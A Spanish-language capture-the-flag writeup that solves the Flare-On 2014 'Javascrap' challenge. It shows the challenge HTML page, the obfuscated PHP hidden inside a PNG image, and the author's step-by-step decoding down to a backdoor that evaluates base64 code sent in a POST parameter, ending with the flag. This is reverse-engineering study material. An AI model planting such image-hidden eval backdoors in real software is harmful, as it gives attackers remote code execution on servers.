---
title: "Flare-on 2014 - Challenge 02: Javascrap"
date: "2018-10-24T15:16:00-05:00"
draft: false
tags: ["flareon","revisitado","flareon2014","javascript","reversing","writeup"]
categories: ["reversing","ctf"]
description: "Otro writeup mas de como resolver el reto 02 del primer Flare-On_2014 de Fireeye, llamado Javascrap.

Bien comenzamos por descargar este reto, \"C2.zip\" y validarlo. En este challenge y los siguientes todos serán archivos zip con la contraseña \"malware\""
---

Bien comenzamos por descargar este reto, "C2.zip" y validarlo. En este challenge y los siguientes todos serán archivos zip con la contraseña "malware", por lo que iniciamos descomprimiendo el archivo en nuestra carpeta challenge02:

![unzip](/img/flareon-2014-challenge-02/unzip.png)

Al ver el contenido tenemos 2 archivos, una imagen y un archivo html:

![file](/img/flareon-2014-challenge-02/file-of-content.png)

Si analizamos el documento html tenemos lo siguiente:

```
<!DOCTYPE html>

<html>

<head>
    <meta charset="utf-8">
    <title>The FLARE On Challenge</title>
    <link rel="stylesheet" type="text/css" href="http://bootswatch.com/lumen/bootstrap.min.css">
    <style type="text/css">
        #counter {
            width: 210px;
            height: 80px;
            font-size: 35px;
        }
        .points {
            float: left;
            width: 20px;
            font-size: 20px;
            font-weight: bold;
            text-align: center;
            line-height: 70px;
            text-shadow: none;
        }
        .position {
            position: relative;
            float: left;
            width: 15px;
            height: 92px;
            margin: 8px 0 0 0;
        }
        .digit {
            position: absolute;
            top: 0;
            left: 0;
        }
        .boxName {
            float: left;
            width: 30px;
            margin: 45px 0 0 -28px;
            font-size: 12px;
            color: #a6a6a6;
        }
        .Hours { margin-left: 5px; }
        .Seconds { margin-left: 2px; }
    </style>
</head>

<body>

    <div class="container">

        <!-- Title and Nav -->
        <img src="img/flare-on.png">
        <ul class="list-inline">
            <li><a onclick="display_me('overview_div')">OVERVIEW</a></li>
            <li><a onclick="display_me('directions_div')">INSTRUCTIONS</a></li>
            <li><a onclick="display_me('advice_div')">RESOURCES</a></li>
            <li><a onclick="display_me('warnings_div')">TERMS & CONDITIONS</a></li>
            <li><a onclick="display_me('solved_div')">FIRST TO SOLVE</a></li>
        </ul>

        <br><br>

        <div class="row">
          <div class="col-md-6">

              <div id="overview_div" style="display:block">
                  <p>The FireEye Labs Advanced Reverse Engineering (FLARE) team is an elite technical
                     group of malware analysts, researchers, and hackers. We are looking to hire smart
                     individuals interested in reverse engineering. We have created this series of binary
                     challenges to test your skills. We encourage anyone to participate and practice their
                     skills while having fun!</p>

                  <p>At launch, a download link for the first challenge will show up here. The first
                     challenge is a self-extracting zip file that requires you accept our End User
                     License Agreement (EULA) before continuing.</p>

              </div>

              <div id="directions_div" style="display:none">
                  <p>It’s simple: Analyze the sample, find the key.</p>
                  <p>Each key is an email address, simply email the email address and it will respond with the next binary challenge.</p>
                  <p>After completing the final challenge, you’ll win a prize and be contacted by a FLARE team member.</p>
              </div>

              <div id="warnings_div" style="display:none">
                  <p>WARNING! Some of these challenges may be malicious.</p>
                  <p>Exercise extreme caution when executing unknown code.</p>
                  <p>Be safe and perform the analysis inside of a virtual machine.</p>
                  <p>The <a href="">EULA</a> describes the terms and conditions of these binaries.</p>
              </div>

              <div id="advice_div" style="display:none">
                  <p>There are tons of tools out there to aid you in your analysis. Here are some suggestions:
                      <ul>
                          <li><a href="https://www.hex-rays.com/products/ida/">IDA Pro</a></li>
                          <li><a href="http://www.ollydbg.de/">Ollydbg</a></li>
                          <li><a href="http://msdn.microsoft.com/en-us/library/windows/hardware/ff551063(v=vs.85).aspx">Windbg</a></li>
                          <li><a href="http://www.ntcore.com/exsuite.php">CFF Explorer</a></li>
                          <li><a href="http://www.hexworkshop.com/">Hex Workshop</a></li>
                          <li><a href="http://ilspy.net/">ILSpy</a></li>
                      </ul>
                  </p>
                  <p>There are also many books out there that could help you. Here are some suggestions:
                      <ul>
                          <li><a href="http://www.amazon.com/Practical-Malware-Analysis-Dissecting-Malicious/dp/1593272901">Practical Malware Analysis</a></li>
                          <li><a href="http://www.amazon.com/IDA-Pro-Book-Unofficial-Disassembler/dp/1593272898">IDA Pro Book</a></li>
                          <li><a href="http://www.amazon.com/Practical-Reverse-Engineering-Reversing-Obfuscation-ebook/dp/B00IA22R2Y">Practical Reverse Engineering</a></li>
                          <li><a href="http://www.amazon.com/x86-Instruction-Set-Architecture-Shanley/dp/0977087859">x86 Instruction Set Architecture</a></li>
                      </ul>
                  </p>
              </div>
              <div id="solved_div" style="display:none">
                  <p>Congratulations to all those that completed the FLARE On challenge!</p>
                  <ol>
                      <li></li>
                      <li></li>
                      <li></li>
                      <li></li>
                      <li></li>
                      <li></li>
                      <li></li>
                      <li></li>
                      <li></li>
                      <li></li>
                  </ol>
              </div>


          </div>
          <div class="col-md-6" style="text-align:center">

                <div style="display:inline-block;"><h3 style="margin-top:0px;margin-bottom:0px;">Launch Date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</h3></div><br/>
                <div style="display:inline-block" id="counter"></div>

          </div>
        </div>

    </div>

    <script>
        function display_me(show_me) {
            document.getElementById('overview_div').style.display = 'none';
            document.getElementById('directions_div').style.display = 'none';
            document.getElementById('warnings_div').style.display = 'none';
            document.getElementById('advice_div').style.display = 'none';
            document.getElementById('solved_div').style.display = 'none';
            document.getElementById(show_me).style.display = 'block';
        }
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
    <script type="text/javascript">!function(s){function a(a){a.addClass("countdownHolder"),s.each(["Days","Hours","Minutes","Seconds"],function(t){var n;n="Days"==this?"DAYS":"Hours"==this?"HRS":"Minutes"==this?"MNTS":"SECS",s('<div class="count'+this+'"><span class="position"><span class="digit static">0</span></span><span class="position"><span class="digit static">0</span></span><span class="boxName"><span class="'+this+'">'+n+"</span></span>").appendTo(a),"Seconds"!=this&&a.append('<span class="points">:</span><span class="countDiv countDiv'+t+'"></span>')})}function t(a,t){var n=a.find(".digit");if(n.is(":animated"))return!1;if(a.data("digit")==t)return!1;a.data("digit",t);var i=s("<span>",{"class":"digit",css:{top:0,opacity:0},html:t});n.before(i).removeClass("static").animate({top:0,opacity:0},"fast",function(){n.remove()}),i.delay(100).animate({top:0,opacity:1},"fast",function(){i.addClass("static")})}var n=86400,i=3600,o=60;s.fn.countdown=function(c){function e(s,a,n){t(r.eq(s),Math.floor(n/10)%10),t(r.eq(a),n%10)}var p,d,l,u,f,r,h=s.extend({callback:function(){},timestamp:0},c);return a(this,h),r=this.find(".position"),function m(){p=Math.floor((h.timestamp-new Date)/1e3),0>p&&(p=0),d=Math.floor(p/n),e(0,1,d),p-=d*n,l=Math.floor(p/i),e(2,3,l),p-=l*i,u=Math.floor(p/o),e(4,5,u),p-=u*o,f=p,e(6,7,f),h.callback(d,l,u,f),setTimeout(m,1e3)}(),this}}(jQuery);</script><?php include "img/flare-on.png" ?>


    <script type="text/javascript">
        $(document).ready(function(){
            $('#counter').countdown({
                timestamp : new Date(2014,6,7,4,0,0,0)
            });
        });
    </script>



</body>
</html>
```

Curioso el include de php:

    <?php include "img/flare-on.png" ?>

Veamos que nos dice strings de este archivo:

![php-in-png](/img/flareon-2014-challenge-02/php-in-png.png)

Hey parece que tenemos un código php dentro de la imagen:

```
<?php $terms=array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);$do_me="";for($i=0;$i<count($order);$i++){$do_me=$do_me.$terms[$order[$i]];}eval($do_me); ?>
```

Pero así parece ilegible lo que tenemos, mejor ordenemos un poco mejor:

```
<?php
$terms=array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");

$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);

for($i=0; $i < count($order); $i++)
{
  $do_me = $do_me.$terms[$order[$i]];
}

eval($do_me); ?>
```

Con $terms tenemos las palabras que estaremos utilizando, mientras que $order nos indica el orden en que se colocaran dichos caracteres. El ciclo for genera un nueva variable $do_me que contiene el texto que ejecutara eval().

Para esto podemos usar el mismo código y crear un archivo c1.php, solo que en lugar de correr eval, corremos print:

![do_me](/img/flareon-2014-challenge-02/do-me.png)

Ok, la salida del comando es el siguiente código:

```
$_= \'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\';
$__=\'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\';
$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
eval($___($__));
```

En esta parte, tenemos 3 definiciones que después pasan por eval(), por lo que empecemos decodificar cada una de ellas:

    $_ = aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9

Esto parece base64, veamos si lo podemos decodificar:

![var1-base64-decode](/img/flareon-2014-challenge-02/var1-base64-decode.png)

Ok, ahora tenemos las siguientes instrucciones:

```
if(
  isset( $_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"]
  )
)
{
  eval(
    base64_decode(
      $_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]
    )
  );
}
```

Las variables $\_POST contienen tanto datos en decimal como hexadecimal, por lo que debemos cambiar el encoding de cada una, para ello he escrito el siguiente programa en python que resuelve los dec y los hex:

```
#!/usr/bin/env python
# encoding: utf-8

import re, binascii

line1=r'\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D'
line2=r'\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D'

def replace_dec(match):
    return chr(int(match.group(1)))

def replace_hex(match):
    return match.group(1)[1:].decode('hex')

regex_dec = re.compile(r"\\(\d{1,3})")
regex_hex = re.compile(r"\\(x[0-9A-Fa-f]{2})")

print regex_hex.sub(replace_hex, regex_dec.sub(replace_dec, line1))
print regex_hex.sub(replace_hex, regex_dec.sub(replace_dec, line2))
```

Esto resuelve los encoding y nos devuelve los siguientes strings:

![decode dec and hex](/img/flareon-2014-challenge-02/decode-dec-and-hex.png)

Si sustituimos DOT, AT y DASH en "a11DOTthatDOTjava5crapATflareDASHonDOTcom" tenemos "a11.that.java5crap@flare-on.com", la cual conforma la flag del reto.

### **flag: a11.that.java5crap@flare-on.com**

---

Espero que les haya gustado.

Saludos,
